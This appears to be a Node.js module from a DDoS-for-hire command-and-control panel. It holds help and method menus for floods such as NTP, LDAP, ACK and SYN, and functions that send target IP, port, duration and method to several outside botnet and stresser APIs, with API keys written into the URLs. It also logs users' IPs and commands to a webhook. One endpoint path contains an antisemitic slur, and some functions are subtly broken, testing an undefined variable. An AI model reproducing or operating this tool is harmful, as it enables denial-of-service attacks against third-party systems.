const fetch = require("node-fetch");
const p = require("phin");

var config = require("./config.js");
var functions = require("./functions.js");
const banners = require("./animated_banners.js");

exports.banner = function() 
{
    var banner = "";
    banner += config.RED + "               ┌────────────────────────┬──────────────────────┐\r\n";
    banner += "               │   " + config.CYAN + "═╗ ╦╦ ╦╔═╗╔═╗╦╔═╗" + config.RED + "    │ " + config.CYAN + "Version: 1.00" + config.RED + "        │\r\n";
    banner += "               │   " + config.CYAN + "╔╩╦╝║ ║╔═╝║  ║╠═╣" + config.RED + "    │ " + config.CYAN + "Developed In NODEJS" + config.RED + "  │\r\n";
    banner += "               │   " + config.CYAN + "╩ ╚═╚═╝╚═╝╚═╝╩╩ ╩" + config.RED + "    │ " + config.CYAN + "Created By: Devious" + config.RED + "  │\r\n";
    banner += "               ├────────────────────────┴──┬───────────────────┤\r\n";
    banner += "               │ " + config.CYAN + "Owners/Admins: draco#5013" + config.RED + " │ " + config.CYAN + "Sacred_demon#4431" + config.RED + " │\r\n";
    banner += "               └───────────────────────────┴───────────────────┘\r\n";
    return banner;
}

exports.help = function() 
{

    var help = "";
    help += "          ┌────────────────────────────────────────────────────────────┐\r\n";
    help += "          │                    ╦ ╦╔═╗╦  ╔═╗                            │\r\n";
    help += "          │                    ╠═╣║╣ ║  ╠═╝                            │\r\n";
    help += "          │                    ╩ ╩╚═╝╩═╝╩                              │\r\n";
    help += "          ├──────────────────────┬─────────────────────────────────────┤\r\n";
    help += "          │ Command Names        │  Command Usage                      │\r\n";
    help += "          ├──────────────────────┼─────────────────────────────────────┤\r\n";
    help += "          │ Help list            │  help                               │\r\n";
    help += "          │ Method list          │  methods                            │\r\n";
    help += "          │ Geo IP               │  geo <ip>                           │\r\n";
    help += "          │ Port Scanner         │  pscan <ip>                         │\r\n";
    help += "          │ Attack               │  attack <ip> <port> <time> <method> │\r\n";
    help += "          │ Clear                │  clear                              │\r\n";
    help += "          └──────────────────────┴─────────────────────────────────────┘\r\n";
    return help;
}

exports.methods = function() 
{
    var method = "";
               
    method += "                                ┌─────────┐\r\n";
    method += "                                │  SLEEK  │\r\n";
    method += "                                ├─────────┤\r\n";
    method += "                                │  NTP    │\r\n";
    method += "                                │  ACK    │\r\n";
    method += "                                │  ESSYN  │\r\n";
    method += "                                │  LDAP   │\r\n";
    method += "                                │  XSYN   │\r\n";
    method += "                                │  SSYN   │\r\n";
    method += "                                │  WIZARD │\r\n";
    method += "                                └─────────┘\r\n";
    return method;
}

exports.BOOT_ATTACK = function() 
{
    p("" + config.cmd_argv[1] + "&port=" + config.cmd_argv[2] + "&time=" + config.cmd_argv[3] + "&method=" + config.cmd_argv[4]).then(r => {
        var data = r.body.toString();
        //console.log(r.body.toString())
        if(!data) {
            console.log("API 1 didnt connect!\r\n");
            return "Something went wrong with connecting to API";
        } else {
            console.log("API 1 Attack Sent!\r\n");
            console.log(data);
            return "Attack sent to " + config.cmd_argv[1] + ":" + config.cmd_argv[2] + " for " + config.cmd_argv[3] + " seconds with " + config.cmd_argv[4];
        }
    }).catch(e => {
        return "API 1 didnt connect!\r\n";
    })
}

exports.BOOT_ATTACK_API2 = function() 
{
    // console.log("API 2 | Attacking launching\r\nIP: " + config.cmd_argv[1] + "\r\nPort: " + config.cmd_argv[2] + "\r\nTime: " + config.cmd_argv[3] + "\r\nMethod: " + config.cmd_argv[4] + "\r\n");

    // p("http://emberservices.cf/EmberApi.php?key=9s8d9sjdx9sdraco&host=" + config.cmd_argv[1] + "&port=" + config.cmd_argv[2] + "&time=" + config.cmd_argv[3] + "&method=" + config.cmd_argv[4]).then(r => {
    //     let data = r.body.toString();
    //     console.log(r.body.toString())
    //     if(!data) {
    //         return "Something went wrong with connecting to API";
    //     } else {
    //         return "Attack sent to " + config.cmd_argv[1] + ":" + config.cmd_argv[2] + " for " + config.cmd_argv[3] + " seconds with " + config.cmd_argv[4];
    //     }
    // }).catch(e => {
    //     socket.write(e);
    // })
}

exports.jiepz_api = function()
{
    p("http://51.68.202.201/api2.php?key=1JagGeR12&host=" + config.cmd_argv[1] + "&port=" + config.cmd_argv[2] + "&time=" + config.cmd_argv[3] + "&method=" + config.cmd_argv[4]).then(r => {
        var apiresponse = r.body.toString();
        //console.log(r.body.toString())
        if(!data) {
            console.log("API 3 didnt connect!\r\n");;
            return "Something went wrong with connecting to API";
        } else {
            console.log("API 3 Attack Sent!\r\n");
            return "Attack sent to " + config.cmd_argv[1] + ":" + config.cmd_argv[2] + " for " + config.cmd_argv[3] + " seconds with " + config.cmd_argv[4];
        }
    }).catch(e => {
        return "API 3 didnt connect!\r\n";
    })
}

exports.atom_api = function() 
{
    p("http://aisu.xyz/API/botnet?key=jiepz14&host=" + config.cmd_argv[1] + "&port=" + config.cmd_argv[2] + "&time=" + config.cmd_argv[3] + "&method=" + config.cmd_argv[4]).then(r => {
        var apiresponse = r.body.toString();
        //console.log(r.body.toString())
        if(!data) {
            console.log("API 4 didnt connect!\r\n");;
            return "Something went wrong with connecting to API";
        } else {
            console.log("API 4 Attack Sent!\r\n");
            return "Attack sent to " + config.cmd_argv[1] + ":" + config.cmd_argv[2] + " for " + config.cmd_argv[3] + " seconds with " + config.cmd_argv[4];
        }
    }).catch(e => {
        return "API 4 didnt connect!\r\n";
    })
}

exports.kosha_api = function()
{
    p("http://req.kosha.cf/fazoland/jews.php?key=mCp8DEIaeWlFgU&network=2&host=" + config.cmd_argv[1] + "&port=" + config.cmd_argv[2] + "&time=" + config.cmd_argv[3] + "&method=" + config.cmd_argv[4]).then(r => {
        var apiresponse = r.body.toString();
        //console.log(r.body.toString())
        if(!data) {
            console.log("API 5 didnt connect!\r\n");;
            return "Something went wrong with connecting to API";
        } else {
            console.log("API 5 Attack Sent!\r\n");
            return "Attack sent to " + config.cmd_argv[1] + ":" + config.cmd_argv[2] + " for " + config.cmd_argv[3] + " seconds with " + config.cmd_argv[4];
        }
    }).catch(e => {
        return "API 5 didnt connect!\r\n";
    })
}


exports.log = function(LOG_NAME, USER, IP, FULLCMD) 
{
    var currenttime = "";
    p("https://devious.cf/time.php").then(r => {
        currenttime = r.body.toString();
    }).catch(e => {
        currenttime = "Failed";
    })
    var newLOG = "";
    newLOG += "#[NEW LOG]# | " + LOG_NAME + "\r\n";
    newLOG += "[USER]: " + USER + " | [IP]: " + IP + "\r\n";
    newLOG += "[TIMESTAMP]: " + currenttime + " | [COMMAND]: " + FULLCMD + "\r\n";
    console.log(newLOG);
}

exports.discord_nontification = function(usr, ip, port, time, m, usersip)
{
    p("https://devious.cf/jDa00EfYS1nr7/hook/?where=c2&key=" + usr + "&host=" + ip + "&port=" + port + "&time=" + time + "&method=" + m + "&usersip=" + usersip).then(r => {
        console.log("Notice Sent!\r\n");
    }).catch(e => {
        console.log(e);
    })
}